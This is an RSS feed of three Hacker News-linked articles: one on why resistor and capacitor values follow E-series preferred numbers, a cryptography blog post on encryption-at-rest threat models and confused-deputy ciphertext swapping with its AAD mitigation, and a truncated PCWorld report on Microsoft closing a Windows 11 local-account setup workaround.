<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Tue, 04 Jun 2024 19:30:04 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Why do electronic components have such odd values? (2021) (128 pts)]]></title>
            <link>https://digilent.com/blog/why-do-electronic-components-have-such-odd-values/</link>
            <guid>40576132</guid>
            <pubDate>Tue, 04 Jun 2024 16:20:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://digilent.com/blog/why-do-electronic-components-have-such-odd-values/">https://digilent.com/blog/why-do-electronic-components-have-such-odd-values/</a>, See on <a href="https://news.ycombinator.com/item?id=40576132">Hacker News</a></p>
<div id="readability-page-1" class="page"><article id="post-4381">
	<!-- .entry-header -->

	<div>
		<p>If you’ve been around electronics for a while, you’ve probably noticed that components like resistors, capacitors, zener diodes, and inductors come in some odd values. Looking at the chart below, there seems to be no clear rationale&nbsp;behind the values, but there is a pattern. 47kΩ resistors and 22μF capacitors are everywhere, but not 40kΩ or 50kΩ resistors, or 20μF or 30μF capacitors. So what’s the deal? It all has to do with <a href="http://en.wikipedia.org/wiki/Preferred_number" target="_blank" rel="noopener">preferred numbers</a>.</p>
<p><a href="https://digilent.com/blog/wp-content/uploads/2015/01/resistor-color-codes.png"><img fetchpriority="high" decoding="async" src="https://digilent.com/blog/wp-content/uploads/2015/01/resistor-color-codes-600x600.png" alt="resistor-color-codes" width="600" height="600" srcset="https://digilent.com/blog/wp-content/uploads/2015/01/resistor-color-codes.png 600w, https://digilent.com/blog/wp-content/uploads/2015/01/resistor-color-codes-150x150.png 150w, https://digilent.com/blog/wp-content/uploads/2015/01/resistor-color-codes-225x225.png 225w, https://digilent.com/blog/wp-content/uploads/2015/01/resistor-color-codes-300x300-cropped.png 300w" sizes="(max-width: 600px) 100vw, 600px"></a></p>
<p>We have to go back a few years to 1877 France. The French military used balloons for various purposes and of various sizes, and they had to be anchored using cables. Over time, they ended up with 425 different sizes of mooring cables that had to be individually ordered and inventoried. Talk about a nightmare.</p>
<p>Enter Charles Renard. He was tasked with improving the balloons, but discovered this rat’s nest of cables in the inventory closet instead. He spent some time thinking about it and came up with a series of 17 cable sizes that would allow for every type of balloon to be properly moored. Each size of cable had a max/min rating that just overlapped it’s neighbor above and below, so every required value was covered by one or more cable. This system of numbers became known as the “Renard numbers” and was later included in the&nbsp;“preferred numbers” when the concept was expanded for other applications and became an international standard with ISO (International Organization for Standards) 3 in 1952.</p>
<p>Since then, numerous international standards have been adopted by ISO for countless things, but one of those is how we identify&nbsp;certain electronic components. Using the same idea that Renard developed, these components are labeled with what are known as E-series values within the preferred number system. The lowest value is E6, which enumerates six&nbsp;values between&nbsp;two consecutive powers of 10, i.e., between 10 and 100 or between 10k and 100k. Starting with 10, we increase that value by roughly half and we get 15. Increase by roughly half again and we get 22. Continuing this trend, rounding as needed, and we end up with the series 10, 15, 22, 33, 47, and 68. Components built to the E6 standard have a 20% relative error tolerance, and if we look at the values again we’ll see a trend. Starting with 10 again and adding 20% error we end up with 12. Moving to 15 and subtracting 20% we get… wait for it… 12. Moving up from 15 we get 15 + 20% = 18 and 22 – 20% = 17.6. This trend repeats no matter what range of powers of 10 you use, as long as they are consecutive. So 47kΩ&nbsp;+ 20% = 56400, while 68kΩ – 20% = 54400.</p>
<p>Look again at the values 47 and 68. The max/min values overlap right about 56, don’t they? That sounds familiar. The E12 standard uses all of the same values as E6, but with 6 more values mixed in. These 6 additional values are roughly where the E6 values overlap, and now in order to cover the entire range our %-error is reduced to 10%. Starting again at 10, we have 10, 12, 15, 18, 22, 27, 33, 39, 47, 56, 68, and 82. The math holds true here as well, with the error values just slightly overlapping.</p>
<p>There are four&nbsp;more E-series as well, namely E24, E48, E96, and E192. The image above lists all values included in the E6/E12/E24 standards. With each doubling of&nbsp;values between consecutive powers of 10, there is an associated halving of the %-error allowance as well. So E24 values have a +/- %-error of 5%, E48 is set at 2%, and so on. The values associated with E192 are also available with 0.25% and 0.1% tolerances, and E24 and E96 are also available with 1% tolerances.</p>
<p>Below is a simple graphical view of how the E12 values relate to one another. Along the bottom of the graph you will see the first 13 terms&nbsp;of an ideal geometric sequence as well. (The sequence is given by y=10^(<em>i</em>/<em>b</em>), where <em>b</em> is the value of the series (e.g. 12) and <em>i</em> is the term desired (e.g. the 8th term would yield 10^(8/12)=4.64).) Notice how closely the values are related.</p>
<figure id="attachment_4382" aria-describedby="caption-attachment-4382"><a href="https://digilent.com/blog/wp-content/uploads/2015/01/E12_series_tolerance.svg_.png"><img decoding="async" src="https://digilent.com/blog/wp-content/uploads/2015/01/E12_series_tolerance.svg_-343x600.png" alt="E12_series_tolerance.svg" width="343" height="600" srcset="https://digilent.com/blog/wp-content/uploads/2015/01/E12_series_tolerance.svg_.png 343w, https://digilent.com/blog/wp-content/uploads/2015/01/E12_series_tolerance.svg_-129x225.png 129w" sizes="(max-width: 343px) 100vw, 343px"></a><figcaption id="caption-attachment-4382">This graph shows how any value between 1 and 10 is within ±10% of an E12 series value, and its difference from the ideal value in a geometric sequence. By Anders Andersson from <a href="http://commons.wikimedia.org/wiki/File%3AE12_series_tolerance.svg" target="_blank" rel="noopener">Wikimedia Commons</a>.</figcaption></figure>
<p>While it is possible to have a 3.3kΩ resistor with 20% tolerance test out between 2.64kΩ and 3.96kΩ, I would be hesitant to use it. I want 3.3kΩ, so I tend to use resistors with a higher tolerance, usually 5%, so I can just reach in my bin and know that I’m reasonably close. Looking back at the table in the beginning,&nbsp;we see that there are values of 68 and 75 listed. If I’m looking for a value of 70 (or some multiple power of 10, like 700), what can I do to achieve it? I can certainly start testing every 68 valued resistor I can find (75 is just out of range of 5% tolerance), hoping to find one that is just right, but just because it says 5%, doesn’t mean it is. That is a maximum allowance, and my experience has been that the tolerances are much tighter than that. I could go up to an E96 (681 0r 715) or even E192 (698!), but resistors with that level of %-error tolerance are not common and cost more. I just want something simple that I already have in my bin! The answer is actually quite simple. Just add a 33 and a 47 and call it good. You get your 70 +/- whatever tolerance you want since 33 and 47 are preferred numbers in every E-series. The point is that any value can be made for any circuit requirement simply by adding components together. When you throw in the rules for calculating components in series and parallel, the combinations are endless.</p>

         
        
                    <!--begin code -->

                    
                    <div data-post_id="30055" data-instance_id="1" data-additional_class="pp-multiple-authors-layout-boxed.multiple-authors-target-the-content" data-original_class="pp-multiple-authors-boxes-wrapper pp-multiple-authors-wrapper box-post-id-30055 box-instance-id-1">
                                                                                                                                    <p><span>
                                                                                                                        <ul>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
                                                                                                                    <li>
                                                                                                                                                                                    <div>
                                                                    <p><img alt="Brandon Marcum" src="https://secure.gravatar.com/avatar/759a6fe8a05fd65a78b981319973577c?s=80&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/759a6fe8a05fd65a78b981319973577c?s=160&amp;d=mm&amp;r=g 2x" height="80" width="80">                                                                                                                                                                                                            </p>
                                                                                                                                    </div>
                                                            
                                                            
                                                                                                                                                                                                                        </li>
                                                                                                                                                                                                                                    </ul>
                                                                            </span>
                                                                                                                        </p></div>
                    <!--end code -->
                    
                
                                
                
        	</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Encryption at Rest: Whose Threat Model Is It Anyway? (173 pts)]]></title>
            <link>https://scottarc.blog/2024/06/02/encryption-at-rest-whose-threat-model-is-it-anyway/</link>
            <guid>40573211</guid>
            <pubDate>Tue, 04 Jun 2024 11:25:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://scottarc.blog/2024/06/02/encryption-at-rest-whose-threat-model-is-it-anyway/">https://scottarc.blog/2024/06/02/encryption-at-rest-whose-threat-model-is-it-anyway/</a>, See on <a href="https://news.ycombinator.com/item?id=40573211">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p><strong>Head’s up</strong>: This is a blog post about applied cryptography, with a focus on web and cloud applications that encrypt data at rest in a database or filesystem. While the lessons can be broadly applicable, the scope of the post is not.</p>



<hr>



<p>One of the lessons I learned during my time at AWS Cryptography (and particularly as an AWS Crypto Bar Raiser) is that the threat model for Encryption At Rest is often undefined.</p>



<p>Prior to consulting cryptography experts, most software developers do not have a clear and concise understanding of the risks they’re facing, let alone how or why the encrypting data at rest would help protect their customers.</p>



<p>Unsurprisingly, I’ve heard a few infosec thought leader types insist that encryption-at-rest is security theater over the years. I disagree with this assessment in the absolute terms, but there is a nugget of truth in that assertion.</p>



<figure><img loading="lazy" data-attachment-id="581" data-permalink="https://scottarc.blog/2024/06/02/encryption-at-rest-whose-threat-model-is-it-anyway/whose-threat-model/" data-orig-file="https://scottarc.blog/wp-content/uploads/2024/06/whose-threat-model.jpg" data-orig-size="566,440" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="whose-threat-model" data-image-description="" data-image-caption="" data-medium-file="https://scottarc.blog/wp-content/uploads/2024/06/whose-threat-model.jpg?w=300" data-large-file="https://scottarc.blog/wp-content/uploads/2024/06/whose-threat-model.jpg?w=566" width="566" height="440" src="https://scottarc.blog/wp-content/uploads/2024/06/whose-threat-model.jpg?w=566" alt="Whose threat model is it anyway?"><figcaption>The million dollar question.</figcaption></figure>



<p>Let’s explore this subject in a little more detail.</p>



<h2>Why should we listen to <em>you</em> about this topic?</h2>



<p>(If you don’t need any convincing, feel free to <a href="#protection">skip this section</a>.)</p>



<p>Encryption at rest is a particular hobby horse of mine. I previously wrote on this blog about <a href="https://scottarc.blog/2023/08/18/innovations-in-the-aws-database-encryption-sdk/">the under-celebrated design decisions in the AWS Database Encryption SDK</a> and <a href="https://scottarc.blog/2022/10/17/lucid-multi-key-deputies-require-commitment/">the need for key-committing AEAD modes in multi-tenant data lakes</a>.</p>



<p>Before my time at Amazon, I had also designed a PHP library called <a href="https://ciphersweet.paragonie.com/">CipherSweet</a> that offers a limited type of Searchable Encryption. The goal of CipherSweet was to improve the cryptography used by SuiteCRM. (The library name is, of course, a pun.)</p>



<p>I’ve also contributed a ton of time making cryptography easy-to-use and hard to misuse outside of the narrow use-case that is at-rest data encryption. To that end, I designed <a href="https://paseto.io/">PASETO</a> as a secure-by-default alternative to JSON Web Tokens.</p>



<p>I also have a lot of skin in the game when it comes to developer comprehension: I was the first Stack Overflow user with a gold badge for both <a href="https://stackoverflow.com/help/badges/1030/security" target="_blank" rel="noreferrer noopener">[security]</a> and <a href="https://stackoverflow.com/help/badges/4641/encryption" target="_blank" rel="noreferrer noopener">[encryption]</a>, largely due to the effort I put into cleaning up the <a href="https://meta.stackoverflow.com/questions/293930/problematic-php-cryptography-advice-in-popular-questions" target="_blank" rel="noreferrer noopener">bad cryptography advice for the PHP ecosystem</a>.</p>



<p>I have spent the past decade or so trying to help teams avoid <a href="https://paragonie.com/blog/2019/05/wordpress-5-2-mitigating-supply-chain-attacks-against-33-internet" target="_blank" rel="noreferrer noopener">security disasters in one form or another</a>. </p>



<h3>Why should we <strong>not</strong> listen to you about this topic?</h3>



<p>If you happen to know a cryptography expert you trust more than some Internet stranger with a blog, I implore you to listen to them if we disagree on any point. They may know something I don’t. (That said, I’m always happy to learn something new!)</p>



<p>I also do <strong>not</strong> have a college degree in Cryptography, nor have I published any papers in prestigious academic journals. If you care very much about this sort of pedigree, you will likely find my words easily discarded. If this describes your situation, no hard feelings.</p>



<h2 id="protection">Why and How to use Encryption At Rest to Protect Sensitive Data</h2>



<blockquote>
<p><strong>Important:</strong> I’m chiefly interested in discussing one use-case, and not focusing on other use cases. Namely, I’m focusing on encryption-at-rest in the narrow context of web applications and/or cloud services.</p>



<p>This is not a comprehensive blog post covering every possible use case or threat model relating to encryption at rest. Those other use cases are certainly interesting, but this post is already long enough with a narrower focus.</p>



<p>In particular: I’m not talking about the threats faced by activists or whistleblowers. This is a software engineering and applied cryptography focused blog post.</p>
</blockquote>



<p>If you’re only interested in compliance requirements, you can probably just enable Full Disk Encryption and call it a day. Then, if your server’s hard drive grows legs and walks out of the data center, your users’ most sensitive data will remain confidential.</p>



<p>Unfortunately, for the server-side encryption at rest use case, that’s basically all that Disk Encryption protects against.</p>



<p>If your application or database software is online and an attacker gains access to it (e.g., through SQL injection), with full disk encryption, <em>it might as well be plaintext</em> to an online attacker.</p>



<figure><img loading="lazy" data-attachment-id="607" data-permalink="https://scottarc.blog/2024/06/02/encryption-at-rest-whose-threat-model-is-it-anyway/full-disk-encryption/" data-orig-file="https://scottarc.blog/wp-content/uploads/2024/06/full-disk-encryption.jpg" data-orig-size="500,559" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="full-disk-encryption" data-image-description="" data-image-caption="" data-medium-file="https://scottarc.blog/wp-content/uploads/2024/06/full-disk-encryption.jpg?w=268" data-large-file="https://scottarc.blog/wp-content/uploads/2024/06/full-disk-encryption.jpg?w=500" width="500" height="559" src="https://scottarc.blog/wp-content/uploads/2024/06/full-disk-encryption.jpg?w=500" alt="Corporate needs you to find the differences between this picture and this picture. Picture 1: Full Disk Encryption. Picture 2: Plaintext Data. Attackers: They're the same picture."><figcaption>It do be like that.</figcaption></figure>



<p>Therefore, if you find yourself reaching for Encryption At Rest to mitigate the impact of the kind of vulnerability that would leak the contents of your database or filesystem to an attacker, you’re probably unwittingly engaging in security theater.</p>



<p>Disk Encryption is important for disk disposal and mitigating hardware theft, not preventing data leakage to online attackers.</p>



<p>So the next logical thing to do is draw a box around the system or component that stores a lot of data and never let plaintext cross that boundary.</p>



<h3>Client-Side Encryption</h3>



<p>Note: The naming here is a little imprecise. It <em>is</em> client-side encryption with respect to your data warehouse (i.e. SQL database), but not with respect to the user experience of a web application. In those cases, client-side would mean on the actual end user’s device.</p>



<p>Instead, client-side encryption is the generic buzz-word to mean that you’re encrypting data outside of the box you drew in your system architecture. Generally, this means that you have an application server that’s acting as the “client” for the purpose of bulk data encryption.</p>



<p>There are a lot of software projects that aim to provide client-side encryption for data stored in a database or filesystems; e.g., in Amazon S3 buckets.</p>



<p>This is a step in the right direction, but implementation details matter a lot.</p>



<blockquote>
<p><em>Quick aside:</em> For the remainder of this blog post, I’m going to assume an architecture that looks like a traditional web application, for simplicity.</p>



<p>The assumed architecture looks vaguely like this:</p>



<ul>
<li>User Agents (e.g., web browsers) that communicate with the application server.</li>



<li>Application Server(s) respond to HTTP requests from user agents, manages key material using KMS, encrypts / decrypts records stored in the database.</li>



<li>Database Server(s) which store ciphertext on behalf of the application server.</li>
</ul>



<p>This is an abstract design, so the actual implementation details you encounter in the real world may be simpler or more complex in different respects.</p>



<p>There are other interesting design considerations for OS-level end-user device encryption that I’m not going to explore today. For example: <a href="https://tosc.iacr.org/index.php/ToSC/article/view/7360">Adiantum</a> is extremely cool.</p>



<p>I’m also not going to dive deep into laptop theft or the importance of Full Disk Encryption as a mechanism for ensuring data is erased from solid state hard drives, or the activities of hostile nation states. That’s a separate discussion entirely.</p>
</blockquote>



<h2 id="security-considerations">Security Considerations for Client-Side Encryption</h2>



<p>The first question to answer when data is being encrypted is, “How are the keys being managed?” This is a very deep rabbit hole of complexity, but one good answer for a centralized service is, “Cloud-based key management service with audit logging”; i.e. AWS KMS, Google CloudKMS, etc.</p>



<p>We could talk about key management for a very long time, but there’s other things I want to focus on, so let’s revisit that in a future blog post.</p>



<p>Next, you have to understand how the data is being encrypted in the first place.</p>



<p><strong>Bad answer:</strong> <a href="https://robertheaton.com/2013/07/29/padding-oracle-attack/" target="_blank" rel="noreferrer noopener">AES in CBC mode without HMAC</a>.</p>



<p><strong>Worse answer:</strong> <a href="https://words.filippo.io/the-ecb-penguin/" target="_blank" rel="noreferrer noopener">AES in ECB mode</a>.</p>



<p>Generally, you’re going to want to use an AEAD construction, such as AES-GCM or XChaCha20-Poly1305.</p>



<p>You’ll also want <a href="https://scottarc.blog/2022/10/17/lucid-multi-key-deputies-require-commitment/">key-commitment</a> if you’re storing data for multiple customers in the same hardware. You can get this property by stapling HKDF onto your protocol (once for key derivation, again for commitment). See also: <a href="https://github.com/paseto-standard/paseto-spec/blob/master/docs/Rationale-V3-V4.md#better-use-of-hkdf-salts-change">PASETO v3 and v4</a>, or <a href="https://aws.amazon.com/blogs/security/improved-client-side-encryption-explicit-keyids-and-key-commitment/" target="_blank" rel="noreferrer noopener">Version 2 of the AWS Encryption SDK</a>.</p>



<p>It may be tempting to build a committing AEAD scheme out of, e.g., AES-CTR and HMAC, but take care that you don’t introduce canonicalization risks in your MAC.</p>



<h3>Is Your Deputy Confused?</h3>



<p>Even if you’re using IND-CCA secure encryption and managing your keys securely, there is still a very stupid attack against many data-at-rest encryption schemes.</p>



<p>To understand the attack, first consider this sort of scenario:</p>



<blockquote>
<p>Alice and Bob use the same health insurance provider, whom is storing sensitive medical records for both parties. Bob works as a database administrator for the insurance company he and Alice both use. One day, he decides to snoop on her private medical history.</p>



<p>Fortunately, the data is encrypted at the web application, so all of the data Bob can access is indistinguishable from random. He can access his own account and see his data through the application, but he cannot see Alice’s data from his vantage point on the database server.</p>
</blockquote>



<p>Here’s the stupid simple attack that works in far too many cases: Bob copies Alice’s encrypted data, and overwrites his records in the database, then accesses the insurance provider’s web app. </p>



<p><strong>Bam!</strong> Alice’s plaintext recovered.</p>



<p>What’s happening here is simple: The web application has the ability to decrypt different records encrypted with different keys. If you pass records that were encrypted for Alice to the application to decrypt it for Bob, and you’re <em>not authenticating your access patterns</em>, Bob can read Alice’s data by performing this attack.</p>



<p>The cryptographic attack is literally copy and paste, from the database administrator’s perspective. It’s stupid but <em>it works against too many encryption-at-rest software projects</em>.</p>



<p>In this setup, the application is the Deputy, and you can easily confuse it by replaying an encrypted blob in the incorrect context.</p>



<p>The mitigation is simple: Use the AAD mechanism (part of the standard AEAD interface) to bind a ciphertext to its context. This can be a customer ID, each row’s value for the primary key of the database table, or something else entirely.</p>



<p>If you’re using AWS KMS, you can also use <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/confused-deputy.html" target="_blank" rel="noreferrer noopener">Encryption Context for this exact purpose</a>.</p>



<h3>An Illustrative Example</h3>



<p>Let’s say you have a simple web application that encrypts data before storing it in a SQL database. </p>



<p>Let’s also write it to use AES-GCM, since unauthenticated CBC mode is awful.</p>



<p>A quick and dirty implementation might look like this:</p>


<div><pre title="">class User {
    public function __construct(
        public readonly string $username,
        public string $email,
        public string $fullName
    ) {}
}

class UserModel {
    public function __construct(protected Database $db)
    {}

    public function save(User $user): bool
    {
        return $this-&gt;db-&gt;upsert(
           'users', 
           [ // set
               'full_name' =&gt; aes128gcm_encrypt($user-&gt;fullName),
               'email' =&gt; aes128gcm_encrypt($user-&gt;email)
                       // encryption details abstracted
           ], 
           [ // where
               'username' =&gt; $user-&gt;username
           ]
        );
    }

    public function fetch(string $username): User
    {
        $row = $this-&gt;db-&gt;fetch('users', ['username' =&gt; $username]);
        return new User(
            $username,
            aes128gcm_decrypt($row['email']),
            aes128gcm_decrypt($row['full_name'])
        );
    }
}
</pre></div>


<p>For the abstracted <code>aes128gcm</code> functions in the pseudocode above, just assume they’re getting the key from KMS during encryption and storing an encrypted data key in a place the ciphertext can reference later on decrypt. I didn’t want to complicate the pseudocode with a lot of boilerplate.</p>



<p>You might decide to prove the confused deputy risk by doing something like this:</p>


<div><pre title="">$model = new UserModel($db);
$model-&gt;save(new User('alice', 'alice@example.com', 'Alice McWonderland'));
$model-&gt;save(new User('bob', 'bob@example.com', 'Bob BurgerMeister'));

// Fetch Alice's data
$aliceData = $db-&gt;fetch('users', ['username' =&gt; 'alice']);
$bobData = $db-&gt;fetch('users', ['username' =&gt; 'bob']);

// This is the attack the database server can perfrom:
// Replace Bob's full_name with Alice's email
$db-&gt;upsert('users', [
    'full_name' =&gt; $alice['email']
], ['username' =&gt; 'bob']);

$badBob = $model-&gt;fetch('bob');
</pre></div>


<p>Now Bob’s full name is set to Alice’s email address.</p>



<h3>The Curious Case of CipherSweet</h3>



<p>My knowledge of this risk didn’t manifest itself in a vacuum. It was discovered over the years of maintaining an open source library.</p>



<p>The first release of CipherSweet mitigated most of this risk by construction: Each field uses a different encryption key, through a key derivation scheme. </p>



<p>In <a href="https://scottarc.blog/wp-content/uploads/2024/06/pseudocode-py.jpg" target="_blank" rel="noreferrer noopener">pseudocode</a>:</p>


<div><pre title="">def encryptRow(self, records):
    for field, type in self.fieldsToEncrypt:
       key = self.getFieldSymmetricKey(self.table, field)
       records[field] = encryptField(key, field)
</pre></div>


<p>Since CipherSweet’s inception, if you try to replace Alice’s encrypted zip code with Alice’s encrypted social security number, the keys would be wrong, so it would lead to a decryption failure.</p>



<p><strong>Or so I thought!</strong></p>



<p>As I mentioned in my blog post about <a href="https://scottarc.blog/2022/10/17/lucid-multi-key-deputies-require-commitment/">multi-tenancy and confused deputy attacks</a>, if your AEAD mode doesn’t commit to the key used, it’s possible to craft a single (ciphertext, tag) that decrypts to two different plaintext values under two different keys.</p>



<p>CipherSweet’s <code>ModernCrypto</code> suite used XChaCha20-Poly1305, which is not key-committing, and therefore susceptible to this sort of misuse.</p>



<p>This violated the Principle of Least Astonishment and motivated the development of a new algorithm suite called <code>BoringCrypto</code>, which used BLAKE2b-MAC instead of Poly1305. This change was released <a href="https://github.com/paragonie/ciphersweet/releases/tag/v3.0.0">in version 3.0.0 in June 2021</a>. </p>



<p>However, even with <code>BoringCrypto</code> in 3.0.0, this only mitigated <em>most of </em> the issue by construction. The last mile of complexity here is that each field must also be bound to a primary key or foreign key.</p>



<p>Encrypting with AAD has been possible since a very early release of CipherSweet, but being possible to use securely is not sufficient. It should be <em>easy</em> to use securely.</p>



<p><a href="https://github.com/paragonie/ciphersweet/releases/tag/v4.7.0">CipherSweet Version 4.7.0</a>, which was released last month, now only requires a code change that looks like this in order to mitigate confused deputies in an application:</p>


<div><pre title="">  $multiRowEncryptor = new EncryptedMultiRows($engine);
  $multiRowEncryptor
+     -&gt;setAutoBindContext(true)
+     -&gt;setPrimaryKeyColumn('table2', 'id')
      -&gt;addTextField('table1', 'field1')
</pre></div>


<p>This is in addition to the new <a href="https://ciphersweet.paragonie.com/php/usage#enhanced-aad">Enhanced AAD</a> feature, which allows for flexible and powerful context binding based on other fields and/or string literals.</p>



<p>(In fact, this new convenience feature actually uses Enhanced AAD under-the-hood.)</p>



<p>This doesn’t come for free, however: Users have to know the serial / primary key for a record prior to writing it, in order to use it as AAD when encrypting fields. However, that’s a much easier pill to swallow than expecting PHP devs to manage the complexity of context-binding themselves.</p>



<p>As you can see, mitigating confused deputies in an encryption library (without making it unwieldy) requires a painstaking attention to detail to get right.</p>



<p>As Avi Douglen says, “Security at the cost of usability comes at the cost of security.”</p>



<p>Given the prevalence of client-side encryption projects that just phone it in with insecure block cipher modes (or <a href="https://fosstodon.org/@atoponce/112550648928122217">ECB, which is the absence of a block cipher mode entirely</a>), it’s highly doubtful that most of them will ever address confused deputy attacks. Even I didn’t get it right at first when I made CipherSweet back in 2018.</p>



<h3>What about non-databases?</h3>



<p>Everything I mentioned in the previous section was focused on confused deputy attacks against client-side encryption for information that is stored in a database, but it’s a general problem with encrypting data at rest and storing the ciphertext “server-side”.</p>



<p>If you’re storing encrypted data in an S3 bucket, rather than in MySQL, you still need some form of context-binding mechanism to prevent the dumb and obvious attack from working against a deputy that reads data from said S3 bucket.</p>



<p>If you take nothing else away from this blog post, remember: <em>Authenticate your access patterns</em>.</p>



<h2>Why aren’t things better already?</h2>



<p>As with most things in software security, the problem is either not widely known, or is not widely understood.</p>



<p>Unknown unknowns tend to fester, untreated, across the entire ecosystem.</p>



<p>Misunderstood issues often lead to an incorrect solution.</p>



<p>In this case, at-rest encryption is mostly in Column B, and confused deputy attacks are mostly in Column A.</p>



<p>The most pronounced consequence of this is, when tasked with building at-rest data encryption in an application, most software developers do not have a cohesive threat model in mind (let alone a formal one).</p>



<p>This leads to disagreement between stakeholders about what the security requirements actually are.</p>



<h3>How can I help improve things somewhat?</h3>



<p>Most importantly, spread awareness of the nuances of encryption at-rest.</p>



<p>This blog post is intended to be a good conversation starter, but there are other resources to consider, too. I’ve linked to many of them throughout this post already.</p>



<p>If you’re paying for software to encrypt data at rest, ask your vendor how they mitigate the risk of confused deputy attacks. Link them to this blog post if they’re not sure what you mean.</p>



<p>If said vendor responds, “this risk is outside of our threat model,” ask to see their formal threat model document. If it exists and doesn’t align with your application’s threat model, maybe consider alternative solutions that provide protection against more attack classes than Full Disk Encryption would.</p>



<p>Finally, gaining experience with <a href="https://www.trailofbits.com/services/software-assurance/appsec/" target="_blank" rel="noreferrer noopener">threat modeling</a> is a good use of every developer’s time. Adam Caudill has <a href="https://adamcaudill.com/2016/07/20/threat-modeling-for-applications/">an excellent introductory blog post on the subject</a>.</p>



<h2>Closing Thoughts</h2>



<p>Despite everything I’ve written here today, I do not claim to have all the answers for encryption at rest.</p>



<p>However, you can unlock a lot of value just by asking the right questions. My hope is that anyone that reads this post is now capable of asking those questions.</p>



<h3 id="addendum-2024-06-03">Addendum (2024-06-03)</h3>



<p>After I published this, the r/netsec subreddit has expressed disappointment that this blog post had “no mention of” consumer device theft or countries experiencing civil unrest and pulling hard drives from data centers.</p>



<p>You could make a congruent  complaint that it also had no mention of Batman.</p>



<p>To be clear, I’m <strong>not</strong> saying that the use cases and risks Reddit cares about are off-topic to any discussion of full-disk encryption. They matter.</p>



<p>Rather, it’s that they’re not relevant to <em>the specific point I am making</em>: Even in the simplest use case, far from the annoying details of end user hardware or the whims of nation states, encryption-at-rest is poorly understood by most developers, and should be thought through carefully.</p>



<p>Your threat model is not my threat model, and vice versa.</p>



<p>I never advertised this blog post as a comprehensive and complete guide to the entire subject of encryption-at-rest. If you too felt under-served by this blog post for not addressing the corner cases that really matter to <em>you</em>, I hope this addendum makes it clearer why I didn’t cover them.</p>



<p>Finally, if you feel that there’s an aspect of the encryption-at-rest topic that really warrants further examination, I invite you to blog about it. </p>



<p>If your blog post is interesting enough, I’ll revise this post and link to it here.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Microsoft blocks Windows 11 workaround that enabled local accounts (160 pts)]]></title>
            <link>https://www.pcworld.com/article/2354686/microsoft-blocks-windows-11-workaround-local-accounts.html</link>
            <guid>40572289</guid>
            <pubDate>Tue, 04 Jun 2024 09:10:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.pcworld.com/article/2354686/microsoft-blocks-windows-11-workaround-local-accounts.html">https://www.pcworld.com/article/2354686/microsoft-blocks-windows-11-workaround-local-accounts.html</a>, See on <a href="https://news.ycombinator.com/item?id=40572289">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="link_wrapped_content">




<p>Before PC users can enjoy everything Windows 11 has on tap, they must first enter an e-mail address that’s linked to a Microsoft account. If you don’t have one, you’ll be asked to create one before you can start setting it up.</p>



<p>A frequently used trick to circumvent this block is a small but ingenious step. By entering a random e-mail address and password, which doesn’t exist and causes the link to fail, you end up directly with the creation of a local account and can thus avoid creating an official account with Microsoft.</p>



		

		


<p>Many users prefer this method, as a local account promises more control over their own data and more privacy. However, without a Microsoft account, some useful functions are also lost such as account backup or special features for apps like Copilot.</p>



<p>This common method no longer seems to work, as Microsoft has apparently patched this bug. Instead of skipping the account link, you’re led into a kind of continuous loop that doesn’t end until you have entered the correct email address.</p>

		
			
			


<figure><div>
<blockquote data-width="500" data-dnt="true"><p lang="en" dir="ltr">It looks like Microsoft has blocked the bypass that allowed you to create a local account during Windows 11 setup by typing in a blocked email address. Now it just loops you back to typing in a different account ðŸ™ <a href="https://go.redirectingat.com/?id=111346X1569483&amp;url=https://t.co/mKnHToLLQV&amp;xcust=2-1-2354686-1-0-0&amp;sref=https://www.pcworld.com/article/2354686/microsoft-blocks-windows-11-workaround-local-accounts.html" rel="nofollow">pic.twitter.com/mKnHToLLQV</a></p>— Zac Bowden (@zacbowden) <a href="https://go.redirectingat.com/?id=111346X1569483&amp;url=https://twitter.com/zacbowden/status/1797496910737252744?ref_src=twsrc%5Etfw&amp;xcust=2-1-2354686-1-0-0&amp;sref=https://www.pcworld.com/article/2354686/microsoft-blocks-windows-11-workaround-local-accounts.html" rel="nofollow">June 3, 2024</a></blockquote>
</div></figure>



<p>Previously, it was possible to cut the Internet connection in the Task Manager before creating an account. Microsoft has since removed this workaround. As a result, many people who previously used this method are now forced to enter a working Microsoft account email address and password or use other methods.</p>



<h2 id="bypassing-microsoft-account-restrictions">Bypassing Microsoft account restrictions</h2>



